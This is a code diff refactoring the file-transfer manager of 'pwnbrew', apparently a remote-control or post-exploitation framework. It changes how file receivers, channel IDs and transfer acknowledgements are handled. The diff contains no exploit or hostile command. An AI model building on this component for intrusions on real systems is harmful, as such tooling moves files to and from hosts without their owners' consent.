@@ -57,8 +57,7 @@ import pwnbrew.concurrent.LockListener;
 import pwnbrew.log.LoggableException;
 import pwnbrew.manager.PortManager;
 import pwnbrew.manager.DataManager;
-import pwnbrew.misc.DebugPrinter;
-import pwnbrew.misc.FileUtilities;
+import pwnbrew.utilities.FileUtilities;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.PortRouter;
 import pwnbrew.network.control.ControlMessageManager;
@@ -142,35 +141,50 @@ public class FileMessageManager extends DataManager implements LockListener {
         return (FileHandler)theDataHandler;
     }  
     
-    //===============================================================
+    
+//    
+//    //===============================================================
+//    /**
+//    * Sets up for a file transfer
+//    *
+//    * @param fileToTransfer
+//    * @return
+//    */
+//    private void initFileTransfer( int passedSrcHostId, int passedTaskId, int passedFileId, File parentDir, String hashFilenameStr, long passedFileSize) 
+//            throws LoggableException, NoSuchAlgorithmException, IOException {
+        
+     //===============================================================
     /**
     * Sets up for a file transfer
     *
     * @param fileToTransfer
     * @return
     */
-    private void initFileTransfer( int passedSrcHostId, int passedTaskId, int passedFileId, File parentDir, String hashFilenameStr, long passedFileSize) 
-            throws LoggableException, NoSuchAlgorithmException, IOException {
+    private void initFileTransfer( PushFile passedMsg, File parentDir ) throws LoggableException {
 
         //Get the socket router
         ClientConfig theConf = ClientConfig.getConfig();
         int socketPort = theConf.getSocketPort();
-        String serverIp = theConf.getServerIp();
+//        String serverIp = theConf.getServerIp();
         ClientPortRouter aPR = (ClientPortRouter) thePortManager.getPortRouter( socketPort );
                        
         //Initiate the file transfer
         if(aPR != null){
             
-            aPR.ensureConnectivity( serverIp, socketPort, this );       
-            
+//            aPR.ensureConnectivity( serverIp, socketPort, this );       
+            int fileId = passedMsg.getFileId();
             //Initialize the file transfer
             synchronized( theFileReceiverMap ){
-                FileReceiver theReceiver = theFileReceiverMap.get(passedFileId);
+                FileReceiver theReceiver = theFileReceiverMap.get(fileId);
                 //If the receive flag is not set
                 if( theReceiver == null ){
 
-                    theReceiver = new FileReceiver( this, passedSrcHostId, passedTaskId, passedFileId, passedFileSize, parentDir, hashFilenameStr );
-                    theFileReceiverMap.put(passedFileId, theReceiver);
+                    try {
+                        theReceiver = new FileReceiver( this, passedMsg, parentDir );
+                        theFileReceiverMap.put(fileId, theReceiver);
+                    } catch (NoSuchAlgorithmException | IOException ex) {
+                        throw new LoggableException("Unable to create a new file receiver.");
+                    }
 
                 } else {
                     throw new LoggableException("A file receive is already in progress.");
@@ -223,8 +237,8 @@ public class FileMessageManager extends DataManager implements LockListener {
         boolean retVal = false;
         int taskId = passedMessage.getTaskId();
         int fileId = passedMessage.getFileId();
-        int srcId = passedMessage.getSrcHostId();
-
+        int fileChannelId = passedMessage.getFileChannelId();
+     
         File libDir = null;
         int fileType = passedMessage.getFileType();
         switch(fileType){
@@ -239,27 +253,22 @@ public class FileMessageManager extends DataManager implements LockListener {
                 
         if( libDir != null ){
             
-            //Get the control manager for sending messages
-            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
-            if( aCMManager != null ){
-                try {
-                    //Get the hash/filename
-                    String hashFileNameStr = passedMessage.getHashFilenameString();
-
-                    //Try to begin the file transfer
-                    initFileTransfer( srcId, taskId, fileId, libDir, hashFileNameStr, passedMessage.getFileSize() );
-
-                    //Send an ack to the sender to begin transfer
-                    DebugPrinter.printMessage(PortManager.class.getSimpleName(), "Sending ACK for " + hashFileNameStr);
-                    PushFileAck aSFMA = new PushFileAck(taskId, fileId, hashFileNameStr);
-                    aSFMA.setDestHostId( passedMessage.getSrcHostId() );
-                    aCMManager.send(aSFMA);
+//            //Get the control manager for sending messages
+//            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+//            if( aCMManager != null ){
                 
-                } catch ( IOException | NoSuchAlgorithmException  ex){
-                    throw new LoggableException(ex);
-                }
+                String hashFileNameStr = passedMessage.getHashFilenameString();
+                initFileTransfer( passedMessage, libDir );
+                
+                //DebugPrinter.printMessage(PortManager.class.getSimpleName(), "Sending ACK for " + hashFileNameStr);
+                PushFileAck aSFMA = new PushFileAck(fileChannelId, taskId, fileId, hashFileNameStr);
+                aSFMA.setDestHostId( passedMessage.getSrcHostId() );
+                
+                //Send the message
+                DataManager.send(thePortManager, aSFMA);
+//                aCMManager.send(aSFMA);
                 retVal = true;
-            }
+//            }
 
         }
 
@@ -319,9 +328,10 @@ public class FileMessageManager extends DataManager implements LockListener {
      * 
      * @param taskId 
      */
-    public void cancelFileTransfer(int taskId) {
+    public void cancelFileTransfer( int taskId ) {
         
         //Cancel file receives
+        int channelId = 0;
         synchronized( theFileReceiverMap ){
             
             List<Integer> fileIds = new ArrayList<>(theFileReceiverMap.keySet());
@@ -331,6 +341,7 @@ public class FileMessageManager extends DataManager implements LockListener {
                 int receiverId = aReceiver.getTaskId();
                 if( receiverId == taskId ){
                     aReceiver.cleanupFileTransfer();
+                    channelId = aReceiver.getChannelId();
                     theFileReceiverMap.remove( anId );
                 }
                 
@@ -347,6 +358,7 @@ public class FileMessageManager extends DataManager implements LockListener {
                 List<Integer> aFileId = new ArrayList<>(aSenderMap.keySet());
                 for( Integer anId : aFileId ){
                     FileSender aSender = aSenderMap.get(anId);
+                    channelId = aSender.getChannelId();
                     aSender.shutdown();
                     aSenderMap.remove( anId );
                 }
@@ -357,13 +369,15 @@ public class FileMessageManager extends DataManager implements LockListener {
         }
         
         //Clear the send buffer
-        PortRouter aPR = thePortManager.getPortRouter( ClientConfig.getConfig().getSocketPort() );
-        SocketChannelHandler aSCH = aPR.getSocketChannelHandler();
+        if( channelId != 0 ){
+            PortRouter aPR = thePortManager.getPortRouter( ClientConfig.getConfig().getSocketPort() );
+            SocketChannelHandler aSCH = aPR.getConnectionManager().getSocketChannelHandler(channelId);
 
-        //Set the wrapper
-        if( aSCH != null ){
-            aSCH.clearQueue();
-        }    
+            //Set the wrapper
+            if( aSCH != null ){
+                aSCH.clearQueue();
+            }  
+        }  
         
         
     }
